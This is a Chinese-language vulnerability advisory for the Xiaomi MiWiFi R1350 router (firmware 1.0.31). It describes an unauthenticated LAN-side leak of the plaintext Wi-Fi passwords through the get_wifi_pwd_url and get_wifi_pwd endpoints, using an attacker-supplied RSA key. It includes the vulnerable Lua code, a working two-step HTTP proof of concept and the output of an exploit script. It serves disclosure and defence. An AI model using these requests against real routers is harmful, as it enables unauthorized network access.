# 小米 MiWiFi R1350 路由器

- 厂商：小米（Xiaomi）
- 产品：小米 AIoT 路由器 R1350（AC1200）
- 固件版本：1.0.31（miwifi_r1350_firmware_7449d_1.0.31.bin，QSDK / OpenWrt，MIPS32 大端）
- 漏洞类型：未授权敏感信息泄露（CWE-200）

## 概述

小米 MiWiFi R1350（固件 1.0.31）存在一个未授权信息泄露漏洞，LAN 侧攻击者无需任何认证即可获取路由器的**明文 Wi-Fi 密码（2.4G 和 5G 的 SSID 及密钥）**。两个接口相互配合（均以授权标志位 `0x09` = noauth + noinit 注册）：

```
GET /cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=<攻击者控制的公钥>
GET /cgi-bin/luci/api/misystem/get_wifi_pwd?token=<设备 UUID>
```

该流程的设计初衷是小米 IoT 配网握手（智能设备向路由器请求用设备自身公钥加密的 Wi-Fi 凭据）。但由于*任何人*都可以提供*任意*公钥——包括攻击者自己持有私钥的公钥——凭据的保密性形同虚设：攻击者“加密给自己”，再在本地解密。

## 漏洞详情

组件：`/usr/lib/lua/luci/controller/api/misystem.lua`（1.0.31）

`getWifiPwdUrl()`（第 4125 行起）：

![](./images/4-001.png)

```lua
local rsa_pub_key = LuciHttp.formvalue("rsa_pubkey")   -- 攻击者控制，无任何校验
write_txt(CACHE_PUBKEY_PATH, rsa_pub_key)              -- /tmp/iot_pubkey_cache
local timestamp = os.time()
write_txt(CACHE_TIME_PATH, timestamp)                  -- 300 秒有效窗口
local token = read_txt(UUID_PATH)                      -- /proc/sys/kernel/random/uuid（设备 UUID）
write_txt(CACHE_TOKEN_PATH, token)
local url = string.format('http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd?token=%s', lanip, token)
local url_new = lua_crypto.lua_rsa_pubkey_encrypt(url, rsa_pub_key)  -- 用攻击者的公钥加密
result["url"] = XQCryptoUtil.binaryBase64Enc(url_new)
```

`getWifiPwd()`（第 4230 行起）：

![](./images/4-003.png)

```lua
local token = LuciHttp.formvalue("token")
local token_local = read_txt(CACHE_TOKEN_PATH)         -- 固定的设备 UUID
if token_local ~= nil and token == token_local then     -- 仅与攻击者刚拿到的 UUID 做相等比较
    -- 300 秒时间戳检查，而时间戳由攻击者自己的第 1 步请求设置
...
local pwd_origin = json.encode(iot_info)               -- {2gssid, 2gpwd, 5gssid, 5gpwd} 明文
local rsa_pub_key = read_txt(CACHE_PUBKEY_PATH)        -- 攻击者的公钥
local pwd_new = lua_crypto.lua_rsa_pubkey_encrypt(pwd_origin, rsa_pub_key)
result["info"] = XQCryptoUtil.binaryBase64Enc(pwd_new)
```

设计缺陷：

1. 公钥完全由攻击者控制且无需认证，因此加密对请求方而言不提供任何保密性。
2. `token` 并非秘密：它是设备 UUID（`/proc/sys/kernel/random/uuid`），并且由 `get_wifi_pwd_url` 亲手交给攻击者（用攻击者自己的公钥 RSA 加密）。300 秒有效窗口同样由攻击者自己的请求激活。
3. `read_txt()` 只读取单行，而 `librsa.so`（mbedTLS 的 `pk_parse_public_key`，经由 `public_encrypt_keybuf`）接受**单行 base64（SPKI DER）公钥**——这正是攻击者会提供的格式。

## 漏洞证明（PoC）

```http
GET /cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... HTTP/1.1
Host: 192.168.31.1

```

响应（`url` = base64(RSA_<攻击者公钥>(包含 token 的 url))）：

```json
{"url":"PNw08FvhHDk4+/TkIhzrs2K3x4LfOTluzKy2wBpRPB55B0nLA72YKxPlaRhGVQDdM...","code":0}
```

用攻击者的私钥解密后：

```
http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd?token=e95f2a41-7c3b-4d58-9a1f-3b2c8d61f7a4
```

第 2 步：

```http
GET /cgi-bin/luci/api/misystem/get_wifi_pwd?token=e95f2a41-7c3b-4d58-9a1f-3b2c8d61f7a4 HTTP/1.1
Host: 192.168.31.1

```

响应（`info` = base64(RSA_<攻击者公钥>(json))）：

```json
{"info":"r67C5hYqAuxfycfvVawut4ecungrVe44YSWeNOufxr8Gb92yXFHi84I81aLfcdO...","code":0}
```

## 影响

完全未授权的 LAN 侧攻击者可以获取两个 Wi-Fi 的明文密码并加入网络——这通常正是路由器本应守护的信任边界。加入网络后还可进一步利用 `sns_init` 的未授权 RCE（任何 DHCP 客户端均可触达）及其他需认证的攻击面。

## 复现结果

![](./images/4-004.png)

![](./images/4-005.png)

已在 qemu-mips + chroot 模拟的固件环境中（原始 nginx → fcgi-cgi → LuCI 栈）动态验证。自动化 PoC（`exp_wifi_pwd_leak.py`，生成一次性 RSA-2048 密钥对，执行两个请求并解密两段密文）：

```
$ python exp_wifi_pwd_leak.py 192.168.1.5
[*] Step1 GET get_wifi_pwd_url
[+] Step1 解密 url: http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd?token=e95f2a41-...
[+] token = e95f2a41-7c3b-4d58-9a1f-3b2c8d61f7a4 (设备 UUID, 300s 内有效)
[*] Step2 GET get_wifi_pwd
[+] ================= WiFi 凭证 (未授权获取) =================
    5gpwd    = PocSecret#5G
    2gpwd    = PocSecret#2G
    5gssid   = Xiaomi_POC_5G
    2gssid   = Xiaomi_POC_2G
```
